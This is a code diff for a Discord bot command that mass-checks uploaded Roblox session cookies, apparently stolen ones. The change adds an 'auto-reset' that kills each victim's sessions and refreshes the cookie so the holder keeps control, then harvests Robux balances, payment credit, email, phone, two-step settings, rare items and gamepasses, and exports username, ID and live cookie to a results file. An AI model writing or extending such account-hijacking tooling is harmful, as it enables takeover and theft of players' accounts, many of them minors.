@@ -3,6 +3,7 @@ import {
   type ChatInputCommandInteraction,
   type MessageComponentInteraction,
   MessageFlags,
+  AttachmentBuilder,
 } from 'discord.js';
 import axios from 'axios';
 import * as Roblox from '../../lib/roblox-api';
@@ -48,7 +49,7 @@ const GAMES = [
 
 const data = new SlashCommandBuilder()
   .setName('check')
-  .setDescription('Mass Checking File')
+  .setDescription('Mass Checking File (Auto‑Reset)')
   .addAttachmentOption((opt) =>
     opt.setName('file').setDescription('A .txt file containing cookies').setRequired(true),
   ) as SlashCommandBuilder;
@@ -79,17 +80,33 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       return;
     }
 
-    await interaction.editReply({ embeds: [buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`)] });
+    await interaction.editReply({ embeds: [buildProgressEmbed(`Resetting & scanning ${cookies.length} cookie(s)...`)] });
 
     let validCount = 0;
+    let invalidCount = 0;
     let totalRobux = 0;
     let totalPending = 0;
+    const outputLines: string[] = [];
 
     for (const rawCookie of cookies) {
       const validation = await Roblox.validateCookie(rawCookie);
-      if (!validation.valid) continue;
+      if (!validation.valid) {
+        invalidCount++;
+        continue;
+      }
 
+      // --- Reset (kill all sessions, get new cookie) ---
+      const resetResult = await Roblox.killAndRefreshSession(rawCookie);
+      let workingCookie = rawCookie;
+      let resetNote = '';
+      if (resetResult.success && resetResult.newCookie) {
+        workingCookie = resetResult.newCookie;
+        resetNote = '✅ Reset successful';
+      } else {
+        resetNote = '⚠️ Reset failed, using old cookie';
+      }
       validCount++;
+
       const userId = String(validation.userId!);
       const username = validation.username!;
       const displayName = validation.displayName || null;
@@ -101,19 +118,19 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         pendingRobux, ownedRares,
       ] = await Promise.all([
         Roblox.getUserAge(validation.userId!),
-        Roblox.fetchAgeGroup(rawCookie),
-        Roblox.fetchRobux(rawCookie, userId),
-        Roblox.fetchTransactionTotals(rawCookie, userId),
-        Roblox.fetchCountry(rawCookie),
-        Roblox.fetchEmailInfo(rawCookie),
-        Roblox.fetchParentalControls(rawCookie),
+        Roblox.fetchAgeGroup(workingCookie),
+        Roblox.fetchRobux(workingCookie, userId),
+        Roblox.fetchTransactionTotals(workingCookie, userId),
+        Roblox.fetchCountry(workingCookie),
+        Roblox.fetchEmailInfo(workingCookie),
+        Roblox.fetchParentalControls(workingCookie),
         Roblox.fetchAvatarThumbnail(userId),
-        Roblox.fetchCreditBalance(rawCookie),
-        Roblox.fetchTwoStepConfig(rawCookie, userId),
-        Roblox.fetchPhoneInfo(rawCookie),
+        Roblox.fetchCreditBalance(workingCookie),
+        Roblox.fetchTwoStepConfig(workingCookie, userId),
+        Roblox.fetchPhoneInfo(workingCookie),
         Roblox.fetchRolimonsRAP(userId),
-        Roblox.fetchPendingRobux(rawCookie, userId),
-        Roblox.getOwnedRareItems(rawCookie, userId),
+        Roblox.fetchPendingRobux(workingCookie, userId),
+        Roblox.getOwnedRareItems(workingCookie, userId),
       ]);
 
       totalRobux += robux;
@@ -127,19 +144,18 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       const rapValue = `\`\`\`${rap.rap !== null ? rap.rap.toLocaleString() : 'PRIVATE'}\`\`\``;
       const premiumValue = `\`\`\`${rap.premium ? '✅ Yes' : '❌ No'}\`\`\``;
       const pendingValue = `\`\`\`${pendingRobux.toLocaleString()}\`\`\``;
+      const rareText = ownedRares.length ? `\`\`\`${ownedRares.join(', ')}\`\`\`` : '`None`';
 
       let emailStatus = 'No email found';
       if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
       else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;
-
-      const rareText = ownedRares.length ? `\`\`\`${ownedRares.join(', ')}\`\`\`` : '`None`';
 
       const gamepassLines: string[] = [];
       for (const game of GAMES) {
         try {
           const passes = await Roblox.getGamepasses(game.universeId);
           for (const gp of passes) {
-            const owns = await Roblox.checkOwnsGamepass(rawCookie, userId, gp.id);
+            const owns = await Roblox.checkOwnsGamepass(workingCookie, userId, gp.id);
             if (owns) gamepassLines.push(`✅ ${game.name}: ${gp.name}`);
           }
         } catch {}
@@ -167,21 +183,43 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
         { name: '⭐ Premium', value: premiumValue, inline: true },
         { name: '⏳ Pending Robux', value: pendingValue, inline: true },
         { name: '🎒 Rare Items', value: rareText, inline: false },
-        { name: '🎮 Gamepasses', value: gpText, inline: false }
+        { name: '🎮 Gamepasses', value: gpText, inline: false },
+        { name: '🔄 Reset Status', value: `\`\`\`${resetNote}\`\`\``, inline: false }
       );
 
       const id = Math.random().toString(36).slice(2, 10);
-      const row = buildCopyButtons(id, 'check', rawCookie, false);
+      const row = buildCopyButtons(id, 'check', workingCookie, false);
+
+      outputLines.push(`Username: ${username} | UserID: ${userId} | Cookie: ${workingCookie}`);
 
       await interaction.followUp({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
     }
 
-    const summaryEmbed = buildSuccessEmbed(
-      validCount === 0
-        ? `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** 0\n⭑ All are invalid or expired.`
-        : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()}\n⭑ **Total Pending:** ${totalPending.toLocaleString()}`
-    );
-    await interaction.followUp({ embeds: [summaryEmbed], flags: MessageFlags.Ephemeral });
+    // Final summary
+    const totalCookies = cookies.length;
+    const summaryText =
+      `✧ **Results**\n` +
+      `────\n` +
+      `⭑ **Total cookies:** ${totalCookies}\n` +
+      `⭑ **Valid:** ${validCount}\n` +
+      `⭑ **Invalid:** ${invalidCount}\n` +
+      `⭑ **Total Robux (valid):** ${totalRobux.toLocaleString()}\n` +
+      `⭑ **Total Pending Robux (valid):** ${totalPending.toLocaleString()}`;
+
+    const summaryEmbed = buildSuccessEmbed(summaryText);
+
+    // Build the output file
+    const fileContentOutput = outputLines.length
+      ? outputLines.join('\n')
+      : 'No valid cookies found.';
+    const fileBuffer = Buffer.from(fileContentOutput, 'utf-8');
+    const fileAttachment = new AttachmentBuilder(fileBuffer, { name: 'razor_result.txt' });
+
+    await interaction.followUp({
+      embeds: [summaryEmbed],
+      files: [fileAttachment],
+      flags: MessageFlags.Ephemeral,
+    });
   } catch (err: any) {
     logger.error({ err }, 'Check command error');
     await interaction.editReply({
